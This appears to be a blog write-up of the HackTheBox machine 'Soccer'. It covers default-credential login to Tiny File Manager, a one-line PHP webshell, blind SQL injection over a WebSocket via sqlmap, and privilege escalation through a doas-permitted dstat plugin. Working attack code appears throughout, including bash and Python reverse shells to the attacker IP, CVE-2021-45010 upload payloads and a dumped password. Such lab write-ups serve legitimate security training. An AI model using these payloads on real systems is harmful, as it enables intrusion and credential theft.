---
layout: post
title: "HTB: Soccer"
subtitle: "Tiny File Manager default creds to webshell, blind SQLi over a WebSocket for SSH creds, then doas dstat plugin to root"
date: 2023-02-02
tags: [htb, linux, default-creds, websocket-sqli, doas]
category: writeups
kind: machine
tldr: "Tiny File Manager 2.4.3 at /tiny had default admin creds, which let me upload a webshell for a www-data shell. A vhost soc-player.soccer.htb spoke to a WebSocket on 9091 that was blind-SQL-injectable, dumping player:PlayerOftheMatch2022 for SSH. Root came from a doas rule allowing dstat as root plus a writable plugin directory."
---

## the box

Soccer is an easy Ubuntu 20.04 box, but the SQL injection in the middle gives it some texture. The front page is static. The real entry point is a Tiny File Manager install at `/tiny` shipping default credentials, which is enough to drop a webshell. From the resulting `www-data` shell I found a second virtual host backed by a Node app that validates ticket IDs over a WebSocket, and that WebSocket was SQL injectable. Bridging the WebSocket back to plain HTTP let sqlmap dump SSH credentials. Root was a `doas` rule permitting `dstat` plus a writable plugin directory, the dstat-loads-Python-from-a-directory-you-control pattern.

Target was `10.10.11.194`, tun0 was `10.10.16.4`. I added `soccer.htb` to `/etc/hosts` first.

```
10.10.11.194  soccer.htb
```

## recon

Full sweep then a service scan on the open ports:

```bash
nmap -p- --min-rate 10000 10.10.11.194
nmap -p 22,80,9091 -sCV 10.10.11.194
```

```
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-title: Soccer - Index
| http-methods:
|_  Supported Methods: GET HEAD
9091/tcp open  xmltec-xmlmail?
```

Port `9091` was unidentified, but its fingerprint gave it away. The nmap probe results show an HTTP-speaking service that returns `Cannot GET /` with security headers like `Content-Security-Policy: default-src 'none'` and `X-Content-Type-Options: nosniff`:

```
|   GetRequest:
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     <pre>Cannot GET /</pre>
```

That shape is a Node/Express style server, and it ends up being the WebSocket backend. The site on `80` was a static soccer page with nothing in the source but bootstrap leftovers (`/.row`, `/.container`, both part of the framework, not real paths). Directory busting found the live path:

```bash
feroxbuster -u http://soccer.htb
```

```
/tiny  (Status: 301)  [--> http://soccer.htb/tiny/]
```

`/tiny/` served Tiny File Manager. The page footer and the GitHub project name the build:

```
http://soccer.htb/tiny/ [200 OK] Bootstrap[4.5.0], Cookies[filemanager],
  Meta-Author[CCP Programmers], PasswordField[fm_pwd], Title[Tiny File Manager]
```

That is **Tiny File Manager 2.4.3** (login form posts `fm_usr` / `fm_pwd`). The project ships documented default credentials, and `admin:admin@123` logged straight in (the `user:12345` low-priv pair also works).

```
admin:admin@123
```

## foothold

Tiny File Manager 2.4.3 has CVE-2021-45010, a path traversal in the authenticated upload that lets an admin write a PHP file into the webroot. In practice the manager already lets an authenticated user upload into a writable folder and then browse to it, so I did not even need the traversal: I browsed to `/tiny/uploads/` in the file manager, uploaded a one-line PHP shell, and hit it directly.

```php
<?php system($_REQUEST['cmd']); ?>
```

```bash
curl 'http://soccer.htb/tiny/uploads/cmd.php' --data-urlencode 'cmd=id'
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Then a reverse shell through the same webshell:

```bash
curl 'http://soccer.htb/tiny/uploads/cmd.php' \
  --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.16.4/443 0>&1"'
```

The published CVE-2021-45010 PoC automates the harder version of this. It first leaks the webroot path from an upload error message (by pointing `uploadurl` at a junk host so the manager returns the failed file's full path), then writes `<?php system($_REQUEST['cmd']); ?>` via a `../../../../../../../<webroot>/<name>.php` upload path:

```python
payload={"type":"upload","uploadurl":"http://junk.invalid/","ajax":"true"}
# error message leaks the absolute webroot
datas={"p":"","fullpath":f"../../../../../../../{fullpath}/{filename}"}
files={"file":("feb.php","<?php system($_REQUEST['cmd']); ?>","application/x-php")}
```

Both routes land a `www-data` shell. From there I upgraded the shell and enumerated. `/etc/hosts` exposed a second vhost:

```
127.0.0.1  localhost  soccer  soccer.htb  soc-player.soccer.htb
```

The nginx config for it proxies to a Node app on `3000` and forwards WebSocket upgrades:

```nginx
server {
    listen 80;
    server_name soc-player.soccer.htb;
    root /root/app/views;
    location / {
        proxy_pass http://localhost:3000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_cache_bypass $http_upgrade;
    }
}
```

`netstat` confirmed the internal services: the Node app on `127.0.0.1:3000`, MySQL on `127.0.0.1:3306` and `33060`, and the WebSocket bound wide on `0.0.0.0:9091`. I also noticed pm2 sockets under `/root/.pm2/`, so the Node app runs as root, which explains why its webroot is `/root/app/views`.

## user

I added `soc-player.soccer.htb` to `/etc/hosts` and signed up for an account on it. After login the `/check` page holds client JS that opens a WebSocket to port `9091` and sends a ticket id as JSON:

```js
var ws = new WebSocket("ws://soc-player.soccer.htb:9091");
function sendText() {
    var msg = input.value;
    if (msg.length > 0) {
        ws.send(JSON.stringify({ "id": msg }));
    }
}
ws.onmessage = function (e) { append(e.data) }
```

So the page sends `{"id": <ticket>}` and the server replies with whether the ticket exists. Testing the `id` value against the MySQL backend, the only signal is the existence response (`Ticket Exists` vs nothing), so this is blind SQLi over a WebSocket. A UNION probe confirmed both the injection and the column count:

```
{"id":"0 UNION SELECT 1,2,3"}   -> "Ticket Exists"
```

Three columns, injection confirmed. sqlmap does not speak WebSocket on its own (older versions), so I used the rayhan0x01 middleware that fronts the WebSocket with a local HTTP endpoint, turning `?id=` query strings into WebSocket messages. The two edits to that script:

```python
ws_server = "ws://soccer.htb:9091/"
...
data = '{"id":"%s"}' % message
```

Run the middleware, then point sqlmap at the local HTTP endpoint it exposes on `8081`:

```bash
python3 sql.py
# [+] Starting MiddleWare Server
# [+] Send payloads in http://localhost:8081/?id=*

sqlmap -u "http://127.0.0.1:8081/?id=1" --batch -dbs
```

```
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] soccer_db
[*] sys
```

Walking down into `soccer_db`, one table `accounts` with four columns:

```bash
sqlmap -u "http://127.0.0.1:8081/?id=1" --batch -D soccer_db -T accounts -columns
sqlmap -u "http://127.0.0.1:8081/?id=1" --batch -D soccer_db -T accounts -C username,password --dump
```

```
Database: soccer_db
Table: accounts
+----------+----------------------+
| username | password             |
+----------+----------------------+
| player   | PlayerOftheMatch2022 |
+----------+----------------------+
```

Newer sqlmap can drive a WebSocket directly, no middleware:

```bash
sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id":"1"}' \
  --dbms mysql --batch -D soccer_db -T accounts --dump
```

Either way the dumped creds worked over SSH:

```bash
ssh player@10.10.11.194
# player:PlayerOftheMatch2022
```

player held the user flag.

## root

`sudo -l` had nothing, but a SUID `doas` binary was sitting in `/usr/local/bin`:

```bash
find / -perm -4000 2>/dev/null | grep doas
# /usr/local/bin/doas
```

`doas` is the OpenBSD sudo alternative. Its config is usually `/etc/doas.conf`, which did not exist here, so I searched for the real path:

```bash
find / -type f -iname "doas.conf" 2>/dev/null
# /usr/local/etc/doas.conf
```

```
permit nopass player as root cmd /usr/bin/dstat
```

So player can run `dstat` as root with no password. `dstat` loads Python plugins named `dstat_*.py` from a fixed set of directories, and one of those was world-writable:

```bash
ls -ld /usr/local/share/dstat
# drwxrwxrwx ... writable
```

I dropped a reverse-shell plugin there. `dstat` imports the module when invoked with the matching `--name` flag, so the import side effect runs my code as root:

```python
# /usr/local/share/dstat/dstat_reverse.py
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.16.4",8484))
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
import pty;pty.spawn("/bin/bash")
```

```bash
# listener on 8484, then:
doas -u root /usr/bin/dstat --reverse
```

The `--reverse` flag maps to `dstat_reverse.py`, `dstat` imports it as root, and the listener catches a root shell with the root flag. A plain `import os; os.system("/bin/bash")` plugin (run as `doas /usr/bin/dstat --<name>`) gives an interactive root shell the same way without a listener.

## takeaway

Default credentials on an exposed file manager opened the whole box. The part worth dwelling on is the SQLi living behind a WebSocket instead of an HTTP parameter, which standard tooling cannot reach until you bridge the WebSocket to HTTP so sqlmap can drive it. Root is a `doas` rule plus a writable plugin path, the same shape as a sudo binary that loads code from a directory you can write to: the grant is narrow, the directory is not.
